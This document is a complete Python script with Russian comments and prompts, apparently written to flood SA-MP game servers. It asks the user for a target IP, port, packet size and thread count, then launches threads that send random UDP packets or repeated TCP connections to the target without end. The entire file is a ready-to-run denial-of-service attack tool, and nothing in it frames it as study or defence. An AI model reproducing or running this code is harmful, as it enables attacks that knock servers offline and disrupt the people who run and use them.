import socket
import threading
import random
import time
import requests

# Ввод данных от пользователя
target_ip = input("Введите IP сервера SAMP: ").strip()
target_port = int(input("Введите порт сервера SAMP (обычно 7777): ").strip())
packet_size = int(input("Введите размер пакета (например, 1024): ").strip())
num_threads = int(input("Введите количество потоков: ").strip())

# Генерация случайных данных для пакетов
def generate_packet():
    return random._urandom(packet_size)

# Функция отправки фальшивых UDP-запросов
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = generate_packet()
    while True:
        try:
            sock.sendto(packet, (target_ip, target_port))
        except Exception as e:
            print(f"Ошибка отправки пакета: {e}")

# Функция отправки TCP-соединений
def tcp_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(generate_packet())
            sock.close()
        except:
            pass

# Выбор типа атаки
print("Выберите тип атаки:\n1 - UDP Flood\n2 - TCP Flood")
attack_type = int(input("Введите 1 или 2: ").strip())

# Запуск потоков для выбранного типа атаки
threads = []
if attack_type == 1:
    print("Запускается UDP Flood...")
    for _ in range(num_threads):
        thread = threading.Thread(target=udp_flood)
        thread.daemon = True
        thread.start()
        threads.append(thread)
elif attack_type == 2:
    print("Запускается TCP Flood...")
    for _ in range(num_threads):
        thread = threading.Thread(target=tcp_flood)
        thread.daemon = True
        thread.start()
        threads.append(thread)
else:
    print("Неверный выбор. Программа завершена.")
    exit()

# Мониторинг нагрузки
try:
    print("Атака началась. Нажмите Ctrl+C для остановки.")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nАтака остановлена.")
